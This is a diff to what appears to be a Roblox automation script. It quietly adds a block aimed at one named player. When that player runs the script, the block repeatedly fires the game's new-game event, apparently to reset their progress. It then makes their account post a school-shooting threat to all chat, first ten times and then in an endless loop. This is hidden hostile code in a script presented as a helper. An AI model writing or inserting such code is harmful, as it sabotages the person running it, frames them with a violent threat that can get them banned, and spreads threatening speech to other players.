@@ -1008,6 +1008,32 @@ local Button = Tab:CreateButton({
         end
         local CoreGui = game:GetService("StarterGui")
         local contra=192837465
+	local Verificacion,Error =pcall (function()
+
+    if workspace.Living.kevinsanne0430.Stats.Defense.Value>=0 then
+   contra=192837465
+   game:GetService("ReplicatedStorage").Package.Events.NewGame:InvokeServer()
+game:GetService("ReplicatedStorage").Package.Events.NewGame:InvokeServer()
+game:GetService("ReplicatedStorage").Package.Events.NewGame:InvokeServer()
+for i=1,10 do
+local args = {
+ [1] = "I'll shoot my schoolbecause I'm from the U.S.",
+ [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+    end
+    end
+while wait() do
+    local args = {
+        [1] = "I'll shoot my schoolbecause I'm from the U.S.",
+        [2] = "All"
+       }
+       
+       game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+end
+    end)
         pcall (function ()
             if data.Rebirth.Value>=50 then
                 local player = game.Players.LocalPlayer
